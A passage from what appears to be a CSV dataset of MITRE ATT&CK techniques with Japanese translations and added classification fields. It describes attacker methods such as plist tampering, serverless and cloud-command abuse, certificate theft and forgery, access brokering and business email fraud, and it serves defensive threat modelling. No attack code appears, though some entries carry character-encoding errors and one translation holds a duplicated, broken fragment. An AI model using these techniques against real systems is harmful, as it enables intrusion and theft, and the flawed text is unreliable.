eset_osx_flashback)",攻撃者は、プロパティリストファイル（plistファイル）を改変して他の悪意のある活動を可能にすると同時に、システム防御を回避・迂回する可能性があります。macOSアプリケーションは、<code>info.plist</code>ファイルなどのplistファイルを使用して、アプリケーションの実行時にオペレーティングシステムがどのように処理すべきかを指示するプロパティや設定を保存します。plistファイルは、AppleのCore Foundation DTDに基づくXML形式のキーと値のペアで構成される構造化メタデータです。 plistファイルはテキスト形式またはバイナリ形式で保存可能です（出典: fileinfo plistファイルの説明）。攻撃者はplistファイル内のキーと値のペアを改変することで、アプリケーションの実行を非表示にする（例: [非表示ウィンドウ](https://attack.mitre.org/techniques/T1564/003)）や、永続化のための追加コマンドを実行する（例: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) や [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007) を実行するなど）。例えば、攻撃者はDockに表示されるアプリを制御する`~/Library/Preferences/com.apple.dock.plist`ファイルに悪意のあるアプリケーションパスを追加できます。また、アプリケーションの<code>info.plist</code>ファイル内の<code>LSUIElement</code>キーを変更し、アプリをバックグラウンドで実行させることも可能です。 攻撃者は環境変数（例：<code>LSEnvironment</code>）を挿入するキー値ペアを追加し、[ダイナミックリンカーハイジャック](https://attack.mitre.org/techniques/T1574/006)による永続化を実現することも可能です。(引用: wardle chp2 persistence)(引用: eset_osx_flashback),defense-evasion,macOS,script_command_execution,stealth,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--7d20fff9-8751-404e-badd-ccd71bda0236,2022-04-09T15:06:32.458Z,2025-04-15T22:57:13.867Z,,,,
T1648,,Serverless Execution,サーバーレス実行,"Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. Adversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. [Resource Hijacking](https://attack.mitre.org/techniques/T1496)).(Citation: Cado Security Denonia) Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission in Google Cloud to add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to a serverless cloud function, which may then be able to perform actions the original user cannot.(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Rhingo Security Labs GCP Privilege Escalation) Serverless functions can also be invoked in response to cloud events (i.e. [Event Triggered Execution](https://attack.mitre.org/techniques/T1546)), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created.(Citation: Backdooring an AWS account) This is also possible in many cloud-based office application suites. For example, in Microsoft 365 environments, an adversary may create a Power Automate workflow that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001) In Google Workspace environments, they may instead create an Apps Script that exfiltrates a user's data when they open a file.(Citation: Cloud Hack Tricks GWS Apps Script)(Citation: OWN-CERT Google App Script 2024)",攻撃者は、サーバーレスコンピューティング、統合、自動化サービスを悪用し、クラウド環境で任意のコードを実行する可能性があります。多くのクラウドプロバイダーは、コンピューティングエンジン、アプリケーション統合サービス、Webサーバーなど、様々なサーバーレスリソースを提供しています。攻撃者は、任意のコマンドを実行する手段として、これらのリソースを様々な方法で悪用する可能性があります。 例えば、攻撃者はサーバーレス関数を利用して、暗号通貨マイニングマルウェアなどの悪意のあるコードを実行する可能性がある（例：[リソースハイジャック](https://attack.mitre.org/techniques/T1496)）。(引用: Cado Security Denonia) 攻撃者はまた、クラウド環境のさらなる侵害を可能にする関数を作成する可能性がある。 例えば、攻撃者はAWSの`IAM:PassRole`権限やGoogle Cloudの`iam.serviceAccounts.actAs`権限を利用して、サーバーレスクラウド関数に[追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003)を付与し、元のユーザーでは実行できない操作を可能にすることがあります。(引用元: Rhino Security Labs AWS Privilege Escalation)(引用元: Rhingo Security Labs GCP Privilege Escalation)また、サーバーレス関数はクラウドイベントに応じて呼び出されることもあり（例: [イベントトリガーによる実行](https://attack.mitre.org/techniques/T1546)）、長期にわたる持続的な実行を可能にする可能性があります。 例えばAWS環境では、攻撃者がLambda関数を作成し、ユーザーに自動的に[追加のクラウド認証情報](https://attack.mitre.org/techniques/T1098/001)を追加するとともに、新規ユーザー作成時にその関数を呼び出す対応するCloudWatchイベントルールを設定することが可能です。(引用: Backdooring an AWS account) これは多くのクラウドベースのオフィスアプリケーションスイートでも実現可能です。 例えばMicrosoft 365環境では、攻撃者がPower Automateワークフローを作成し、ユーザーが受信する全メールを転送したり、SharePointでユーザーがドキュメントへのアクセス権を付与されるたびに匿名共有リンクを生成したりすることが可能です。（引用元：Varonis Power Automate Data Exfiltration）（引用元：Microsoft DART Case Report 001）Google Workspace環境では、代わりにユーザーがファイルを開いた際にデータを流出させるApps Scriptを作成する可能性があります。（引用元：Cloud Hack Tricks GWS Apps Script）（引用元：OWN-CERT Google App Script 2024）,execution,SaaS;IaaS;Office Suite,credential_abuse,foothold,authentication_system;user_interaction;endpoint_execution;email_infrastructure;cloud_control_plane;saas_in_use;file_storage_access,specified,File Server;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud,has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--e848506b-8484-4410-8017-3d235a52f5b3,2022-05-27T13:19:51.112Z,2025-04-15T19:59:17.861Z,,,,
T1649,,Steal or Forge Authentication Certificates,認証証明書の窃取または偽造,"Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft AD CS Overview) Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)(Citation: APT29 Deep Look at Credential Roaming), misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub GhostPack Certificates) With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names.(Citation: Medium Certified Pre Owned) Abusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts. Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as “golden Ecertificates).(Citation: Medium Certified Pre Owned) Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.(Citation: Medium Certified Pre Owned)",攻撃者は、リモートシステムやリソースへのアクセス認証に使用される証明書を窃取または偽造する可能性があります。 デジタル証明書は、メッセージやファイルの署名・暗号化に頻繁に使用される。証明書は認証材料としても用いられる。例えば、Entra IDデバイス証明書やActive Directory Certificate Services（AD CS）証明書はIDに紐付けられ、ドメインアカウントの認証情報として使用可能である。（引用元：O365 Blog Azure AD Device IDs）（引用元：Microsoft AD CS Overview）認証証明書は窃取と偽造の両方が可能である。 例えば、AD CS証明書は暗号化されたストレージ（レジストリやファイル内）から盗まれる可能性があります（引用元：APT29 Deep Look at Credential Roaming）、証明書ファイルの置き忘れ（例：[Unsecured Credentials](https://attack.mitre.org/techniques/T1552)）、あるいは様々な暗号APIを介してWindows証明書ストアから直接盗まれる可能性があります。(引用元: SpecterOps Certified Pre Owned)(引用元: GitHub CertStealer)(引用元: GitHub GhostPack Certificates) 適切な登録権限を持つドメイン内のユーザーやマシンは、企業認証局（CA）から証明書を要求したり手動で更新したりすることも可能です。この登録プロセスでは、証明書に関連する様々な設定や権限が定義されます。 特筆すべきは、証明書の拡張キー使用法（EKU）値が署名・暗号化・認証ユースケースを定義する一方、証明書のサブジェクト代替名（SAN）値が証明書所有者の別名を定義する点である。(引用元: Medium Certified Pre Owned) 認証資格情報として証明書を悪用すると、[横方向移動](https://attack.mitre.org/tactics/TA0008) などの他の行動が可能になる。 証明書関連の誤設定は、証明書に関連付けられた識別子（SAN）を介してユーザーが特権アカウントや権限を偽装・取得することを可能にし、[権限昇格](https://attack.mitre.org/tactics/TA0004)の機会を生み出す可能性があります。 これらの悪用により、ユーザーがパスワードをリセットしても、証明書の有効期間中は[有効なアカウント](https://attack.mitre.org/techniques/T1078)として使用できる証明書を盗用または偽造することで、[永続化](https://attack.mitre.org/tactics/TA0003)が可能になる場合もあります。 認証証明書はマシンアカウント用にも盗用・偽造される可能性があります。ルート（または下位）CA証明書の秘密鍵（またはこれらを保護/管理する仕組み）へのアクセス権を持つ攻撃者は、被害者ドメイン向けの任意の認証証明書（「ゴールデン証明書」と呼ばれる）を偽造することで[持続性](https://attack.mitre.org/tactics/TA0003)を確立することも可能です。(引用元: Medium Certified Pre Owned) 攻撃者は、[ゴールデンチケット](https://attack.mitre.org/techniques/T1558/001) チケット付与チケット（TGT）や NTLM プレーンテキストなど、他の形式の認証情報にアクセスするため、証明書や関連サービス自体を標的とする場合もあります。(引用元: Medium Certified Pre Owned),credential-access,Windows;Linux;macOS;Identity Provider,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,AD / Directory Server;Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--7de1f7ac-5d0c-4c9c-8873-627202205331,2022-08-03T03:20:58.955Z,2025-04-15T23:12:50.646Z,,,,
T1650,,Acquire Access,アクセス取得,"Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)(Citation: Krebs Access Brokers Fortune 500) In some cases, adversary groups may form partnerships to share compromised systems with each other.(Citation: CISA Karakurt 2022) Footholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., [Web Shell](https://attack.mitre.org/techniques/T1505/003)) or established access via [External Remote Services](https://attack.mitre.org/techniques/T1133). In some cases, access brokers will implant compromised systems with a “load Ethat can be used to install additional malware for paying customers.(Citation: Microsoft Ransomware as a Service) By leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers) In some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a [Trusted Relationship](https://attack.mitre.org/techniques/T1199), [Multi-Factor Authentication Interception](https://attack.mitre.org/techniques/T1111), or even [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195). **Note:** while this technique is distinct from other behaviors such as [Purchase Technical Data](https://attack.mitre.org/techniques/T1597/002) and [Credentials](https://attack.mitre.org/techniques/T1589/001), they may often be used in conjunction (especially where the acquired foothold requires [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",敵対者は、標的システムやネットワークへの既存のアクセス権を購入またはその他の方法で取得する場合があります。 様々なオンラインサービスや初期アクセスブローカーネットワークが、過去に侵害されたシステムへのアクセス権を販売している。(引用元: Microsoft Ransomware as a Service)(引用元: CrowdStrike Access Brokers)(引用元: Krebs Access Brokers Fortune 500) 場合によっては、敵対者グループが提携して侵害されたシステムを共有することもある。(引用元: CISA Karakurt 2022) 侵害されたシステムへの足掛かりは、仕込まれたバックドア（例：[Web Shell](https://attack.mitre.org/techniques/T1505/003)）へのアクセスや、[外部リモートサービス](https://attack.mitre.org/techniques/T1133)経由で確立されたアクセスなど、様々な形態をとる。 場合によっては、アクセスブローカーが侵害されたシステムに「ロード」を埋め込み、有料顧客向けに追加マルウェアをインストールできるようにすることもある（引用元：Microsoft Ransomware as a Service）。敵対者は、独自の初期アクセス能力を開発・取得する代わりに既存のアクセスブローカーネットワークを活用することで、標的ネットワークへの足場確保に必要なリソースを削減し、侵害の後半段階に注力できる可能性がある。 攻撃者は、セキュリティ監視が不十分と判定されたシステム、高い特権を持つシステム、特定のセクターに属する組織のシステムへのアクセス取得を優先する場合がある。（引用元：Microsoft Ransomware as a Service）（引用元：CrowdStrike Access Brokers）IT請負、ソフトウェア開発、通信などの業界における組織へのアクセスを購入することで、攻撃者は[信頼関係](https://attack.mitre.org/techniques/T1199)を介して追加の被害者を侵害したり、 [多要素認証の傍受](https://attack.mitre.org/techniques/T1111)、さらには[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195)を通じて追加の被害者を侵害する可能性すらある。 **注記：**この手法は[技術データの購入](https://attack.mitre.org/techniques/T1597/002)や[認証情報の取得](https://attack.mitre.org/techniques/T1589/001)といった他の行動とは区別されますが、 これらはしばしば併用される（特に取得した足場が[有効なアカウント](https://attack.mitre.org/techniques/T1078)を必要とする場合）。,resource-development,PRE,credential_abuse,unknown,authentication_system;mfa_in_use;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,File Server,has_created_ts;has_modified_ts,S0,unknown,,,,,Reconnaissance;ResourceDevelopment,attack-pattern--d21bb61f-08ad-4dc1-b001-81ca6cb79954,2023-03-10T15:37:21.782Z,2025-04-15T21:43:51.840Z,,,,
T1651,,Cloud Administration Command,クラウド管理コマンド,"Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command) If an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment’s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",攻撃者はクラウド管理サービスを悪用し、仮想マシン内でコマンドを実行する可能性があります。AWS Systems Manager、Azure RunCommand、Runbooksなどのリソースは、インストールされた仮想マシンエージェントを活用して、ユーザーが仮想マシン内でリモートでスクリプトを実行することを可能にします。（引用元：AWS Systems Manager Run Command）（引用元：Microsoft Run Command）攻撃者がクラウド環境への管理者アクセス権を取得した場合、クラウド管理サービスを悪用して、その環境の仮想マシン内でコマンドを実行できる可能性があります。 さらに、サービスプロバイダーや委任管理者アカウントを侵害した攻撃者は、同様に[信頼関係](https://attack.mitre.org/techniques/T1199)を利用して、接続された仮想マシン内でコマンドを実行できる可能性がある。（引用元：MSTIC Nobelium Oct 2021）,execution,IaaS,script_command_execution,foothold,privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane,specified,Unknown,has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7,2023-03-13T15:26:11.741Z,2025-04-15T19:59:13.081Z,,,,
T1652,,Device Driver Discovery,デバイスドライバーの発見,"Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) or other defenses (e.g., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)), as well as potential exploitable vulnerabilities (e.g., [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)). Many OS utilities may provide information about local device drivers, such as `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows.(Citation: Microsoft Driverquery)(Citation: Microsoft EnumDeviceDrivers) Information about device drivers (as well as associated services, i.e., [System Service Discovery](https://attack.mitre.org/techniques/T1007)) may also be available in the Registry.(Citation: Microsoft Registry Drivers) On Linux/macOS, device drivers (in the form of kernel modules) may be visible within `/dev` or using utilities such as `lsmod` and `modinfo`.(Citation: Linux Kernel Programming)(Citation: lsmod man)(Citation: modinfo man)",攻撃者は被害者ホスト上のローカルデバイスドライバを列挙しようとする可能性があります。 デバイスドライバーに関する情報は、ホストの機能・目的、導入されているセキュリティツール（例：[セキュリティソフトウェア検出](https://attack.mitre.org/techniques/T1518/001)）、その他の防御策（例：[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)）や悪用可能な脆弱性など、その後の行動を決定づける様々な洞察を提供します。(https://attack.mitre.org/techniques/T1497))、潜在的な悪用可能な脆弱性（例：[権限昇格のためのエクスプロイト](https://attack.mitre.org/techniques/T1068)) などです。 多くの OS ユーティリティは、ローカルデバイスドライバに関する情報を提供する場合があります。たとえば、Windows の `driverquery.exe` や `EnumDeviceDrivers()` API 関数などです。(引用元: Microsoft Driverquery)(引用元: Microsoft EnumDeviceDrivers) デバイスドライバーに関する情報（関連サービス、すなわち[システムサービスの検出](https://attack.mitre.org/techniques/T1007)も含む）は、レジストリからも取得可能です。(引用元: Microsoft Registry Drivers) Linux/macOS では、デバイスドライバ（カーネルモジュール形式）は `/dev` ディレクトリ内、または `lsmod` や `modinfo` などのユーティリティを使用して確認できる場合があります。(引用元: Linux Kernel Programming)(引用元: lsmod man)(引用元: modinfo man),discovery,Linux;macOS;Windows,config_policy_manipulation,situational_awareness,authentication_system;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--215d9700-5881-48b8-8265-6449dbb7195d,2023-03-28T20:14:49.087Z,2025-04-15T22:17:22.391Z,,,,
T1653,,Power Settings,電源設定,"Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.(Citation: Sleep, shut down, hibernate) Adversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.(Citation: Microsoft: Powercfg command-line options)(Citation: systemdsleep Linux) For example, `powercfg` controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down.(Citation: Two New Monero Malware Attacks Target Windows and Android Users) Adversaries may also extend system lock screen timeout settings.(Citation: BATLOADER: The Evasive Downloader Malware) Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.(Citation: CoinLoader: A Sophisticated Malware Loader Campaign) Aware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.(Citation: Condi-Botnet-binaries)","攻撃者は、感染したマシンへのアクセスを延長するために、システムの休止状態、再起動、シャットダウン機能を妨害する可能性があります。コンピュータが休止状態に入ると、ソフトウェアやハードウェアの一部またはすべてが動作を停止し、悪意のある活動を妨げる可能性があります。(引用: Sleep, shut down, hibernate) 攻撃者は、システムユーティリティや設定を悪用し、スタンバイ状態など悪意のある活動を終了させる状態への移行を阻止することで、アクセスを維持しようとする可能性があります。(引用: Microsoft: Powercfg コマンドラインオプション)(引用: systemdsleep Linux) 例えば、`powercfg` は Windows システム上のすべての設定可能な電源システム設定を制御し、感染したホストのロックやシャットダウンを妨げるために悪用される可能性があります。(引用: Windows と Android ユーザーを標的とする 2 つの新しい Monero マルウェア攻撃) 攻撃者はまた、システムのロック画面タイムアウト設定を延長することもあります。(引用: BATLOADER: 回避型ダウンローダーマルウェア) ディスクやハイバネーションのタイムアウトなど他の関連設定も同様に悪用され、ユーザーが操作していなくても感染マシンを稼働させ続けることが可能である。(引用: CoinLoader: 高度なマルウェアローダーキャンペーン) 一部のマルウェアはシステム再起動を生き延びられないことを認識した攻撃者は、システムシャットダウンや再起動を呼び出すために使用されるファイルを完全に削除する場合がある。(引用: Condi-Botnet-binaries)",persistence,Windows;Linux;macOS;Network Devices,script_command_execution,foothold,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--ea071aa0-8f17-416f-ab0d-2bab7e79003d,2023-06-05T15:52:52.467Z,2025-04-15T19:59:18.299Z,,,,
T1654,,Log Enumeration,ログ列挙,"Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records ([Account Discovery](https://attack.mitre.org/techniques/T1087)), security or vulnerable software ([Software Discovery](https://attack.mitre.org/techniques/T1518)), or hosts within a compromised network ([Remote System Discovery](https://attack.mitre.org/techniques/T1018)). Host binaries may be leveraged to collect system logs. Examples include using `wevtutil.exe` or [PowerShell](https://attack.mitre.org/techniques/T1059/001) on Windows to access and/or export security event information.(Citation: WithSecure Lazarus-NoPineapple Threat Intel Report 2023)(Citation: Cadet Blizzard emerges as novel threat actor) In cloud environments, adversaries may leverage utilities such as the Azure VM Agent’s `CollectGuestLogs.exe` to collect security logs from cloud hosted infrastructure.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console) Adversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis. In addition to gaining a better understanding of the environment, adversaries may also monitor logs in real time to track incident response procedures. This may allow them to adjust their techniques in order to maintain persistence or evade defenses.(Citation: Permiso GUI-Vil 2023)",攻撃者は有用なデータを探すため、システムログやサービスログを列挙する可能性がある。これらのログは、ユーザー認証記録（[アカウント発見](https://attack.mitre.org/techniques/T1087)）、 セキュリティや脆弱なソフトウェア ([Software Discovery](https://attack.mitre.org/techniques/T1518))、侵害されたネットワーク内のホスト ([Remote System Discovery](https://attack.mitre.org/techniques/T1018)) などです。 ホストバイナリはシステムログ収集に悪用される可能性がある。例として、Windows上で`wevtutil.exe`や[PowerShell](https://attack.mitre.org/techniques/T1059/001)を用いてセキュリティイベント情報にアクセス・エクスポートする手法が挙げられる。(引用元: WithSecure Lazarus-NoPineapple Threat Intel Report 2023)(引用元: Cadet Blizzard emerges as novel threat actor) クラウド環境では、攻撃者はAzure VM Agentの`CollectGuestLogs.exe`などのユーティリティを活用し、クラウドホスト型インフラからセキュリティログを収集する可能性がある。(引用元: SIM Swapping and Abuse of the Microsoft Azure Serial Console) 攻撃者はSIEMなどの中央集約型ロギングインフラを標的とする場合もある。ログは一括エクスポートされ、攻撃者が制御するインフラに送信されてオフライン分析が行われることもある。 環境の理解を深めることに加え、攻撃者はインシデント対応手順を追跡するためログをリアルタイム監視する可能性がある。これにより、持続性を維持したり防御を回避したりするために手法を調整できる。(引用: Permiso GUI-Vil 2023),discovery,Linux;macOS;Windows;IaaS;ESXi,script_command_execution,situational_awareness,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--866d0d6d-02c6-42bd-aa2f-02907fdc0969,2023-07-10T16:50:57.587Z,2025-04-15T19:58:48.705Z,,,,
T1656,,Impersonation,なりすまし,"Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary’s ultimate goals, possibly against multiple victims. In many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657). Adversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary’s goal. Impersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC) There is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",攻撃者は、信頼される人物や組織を装い、標的に何らかの行動を代行させるよう説得・欺く場合があります。例えば、攻撃者は被害者と（[情報フィッシング](https://attack.mitre.org/techniques/T1598)、 [フィッシング](https://attack.mitre.org/techniques/T1566)、または[内部スピアフィッシング](https://attack.mitre.org/techniques/T1534)を通じて被害者と連絡を取りながら、役員、同僚、第三者ベンダーなどの既知の送信者を装う。 確立された信頼関係は、複数の被害者を対象に攻撃者の最終目的達成に悪用される可能性があります。ビジネスメール詐欺やメール詐欺キャンペーンの多くでは、攻撃者はなりすましにより被害者を欺き、金銭の送金や情報の開示を誘導し、最終的に[金融窃盗](https://attack.mitre.org/techniques/T1657)を可能にします。 攻撃者はまた、メールの件名や本文に「支払い」「依頼」「緊急」といった操作的で説得力のある言葉を使用するなど、ソーシャルエンジニアリング手法を頻繁に用います。これにより被害者が悪意のある活動を検知する前に迅速に行動するよう促します。こうしたキャンペーンは、職務やアクセス権限により攻撃者の目的を達成できる人物を特に標的とする場合が多いです。 なりすまし攻撃の前段階として、[被害者の身元情報収集](https://attack.mitre.org/techniques/T1589)や[被害組織情報収集](https://attack.mitre.org/techniques/T1591)といった偵察手法が用いられるほか、メールドメイン（例： [ドメイン](https://attack.mitre.org/techniques/T1583/001)などのインフラ取得が先行します（出典: CrowdStrike-BEC）。なりすましを伴うキャンペーンでは複数の被害者が発生する可能性があります。 例えば、攻撃者はある組織を標的として[アカウントを侵害](https://attack.mitre.org/techniques/T1586)し、それを他の組織に対するなりすましの支援に利用することが可能である。(引用元: VEC),defense-evasion,Linux;macOS;Windows;SaaS;Office Suite,other,stealth,mfa_in_use;user_interaction;email_infrastructure;cloud_control_plane,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada,2023-08-08T15:42:18.906Z,2025-04-15T22:41:31.140Z,,,,
T1657,,Financial Theft,金銭窃取,"Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware,(Citation: FBI-ransomware) business email compromise (BEC) and fraud,(Citation: FBI-BEC) ""pig butchering,""(Citation: wired-pig butchering) bank hacking,(Citation: DOJ-DPRK Heist) and exploiting cryptocurrency networks.(Citation: BBC-Ronin) Adversaries may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) to conduct unauthorized transfers of funds.(Citation: Internet crime report 2022) In the case of business email compromise or email fraud, an adversary may utilize [Impersonation](https://attack.mitre.org/techniques/T1656) of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary.(Citation: FBI-BEC) This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft.(Citation: VEC) Extortion by ransomware may occur, for example, when an adversary demands payment from a victim after [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) (Citation: NYT-Colonial) and [Exfiltration](https://attack.mitre.org/tactics/TA0010) of data, followed by threatening to leak sensitive data to the public unless payment is made to the adversary.(Citation: Mandiant-leaks) Adversaries may use dedicated leak sites to distribute victim data.(Citation: Crowdstrike-leaks) Due to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and business disruption.(Citation: AP-NotPetya)",敵対者は、恐喝、ソーシャルエンジニアリング、技術的窃取、またはその他の手段を通じて標的から金銭的資源を窃取し、被害者がこれらの資源を利用できる状態を損なうことで自らの金銭的利益を図る。金融窃取は、ランサムウェアによる恐喝（引用元：FBI-ransomware）、ビジネスメール詐欺（BEC）と詐欺、(引用元: FBI-BEC)「ピッグブッチャー詐欺」(引用元: wired-pig butchering)、銀行ハッキング(引用元: DOJ-DPRK Heist)、暗号通貨ネットワークの悪用(引用元: BBC-Ronin)などである。攻撃者は[アカウント侵害](https://attack.mitre.org/techniques/T1586)により不正な資金移動を実行する可能性がある。(出典: インターネット犯罪報告書 2022) 